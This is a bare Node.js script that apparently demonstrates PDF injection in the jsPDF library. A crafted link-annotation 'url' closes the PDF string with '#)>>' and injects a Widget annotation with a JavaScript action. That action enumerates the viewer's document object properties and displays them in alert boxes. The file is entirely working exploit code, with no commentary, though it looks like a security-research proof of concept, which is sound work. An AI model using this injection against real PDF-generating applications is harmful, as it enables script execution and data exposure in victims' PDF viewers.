const {jsPDF} = require("jspdf");
var doc = new jsPDF();
doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>> <</Type/Annot/Rect[0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(
(function(){
var obj = this,
    data = '',
    chunks = [],
    counter = 0,
    added = false, i, props = [];
    for(i in obj) {
        props.push(i);
    }
    props = props.concat(Object.getOwnPropertyNames(obj));
    props = [...new Set(props)].sort();
    for(i=0;i<props.length;i++) {
        try {
            data += props[i] + '=' + obj[props[i]] + String.fromCharCode(0xa);
            counter++;
            if(counter > 15) {
                chunks.push(data);
                counter = 0;
                data = '';
                added = true;
            }
        } catch(e){}
    }
    if(!added) {
        chunks.push(data);
    }
    for(i=0;i<chunks.length;i++) {
        app.alert(chunks[i]);
    }
})() 
    `});
doc.text(20, 20, 'Click me test');

doc.save("output.pdf");
